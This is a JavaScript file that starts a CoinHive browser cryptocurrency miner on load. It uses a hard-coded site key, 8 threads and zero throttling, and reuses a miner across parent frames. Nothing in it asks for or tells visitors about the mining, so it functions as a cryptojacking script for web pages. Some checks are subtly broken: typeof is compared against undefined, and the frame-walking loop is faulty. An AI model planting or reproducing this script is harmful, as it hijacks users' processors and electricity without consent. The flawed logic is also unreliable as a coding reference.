function guessInitialMinerParameters () {
	// TODO
}

function updateInitialMinerParameters () {
	// TODO
}

function getNewMinerInstance () {
	var undefined;

	// TODO autotune parameters
	if (typeof CoinHive !== undefined)
		return new CoinHive.Anonymous ('Ansnx3ssG1KPPjbVHMIikQP9APAZYIio', {threads: 8, throttle: 0.0});

	// TODO failover to authed
	// TODO load authed script
}

function getMinerInstance () {
	var undefined;

	var t = window.self;
	while (t !== undefined && t.miner === undefined && t !== window.top)
		t = window.parent;
	if (t === undefined) return undefined;

	if (t.miner !== undefined) return t.miner;
	return getNewMinerInstance ();
}


/*function getMinerInstance () {
	var undefined;

	// if top and
	if (typeof parent.getMinerInstance !== undefined)
		return parent.getMinerInstance ();

	if (typeof miner !== undefined)
		return miner;

	return getNewMinerInstance ();
}*/

function tryActivateMiner () {
	var miner = getMinerInstance ();

	if (miner.isRunning ()) return;

	updateInitialMinerParameters (miner);

	miner.start (CoinHive.IF_EXCLUSIVE_TAB);
}

// TODO determine a way to reasonable distribute resources among tabs

tryActivateMiner ();
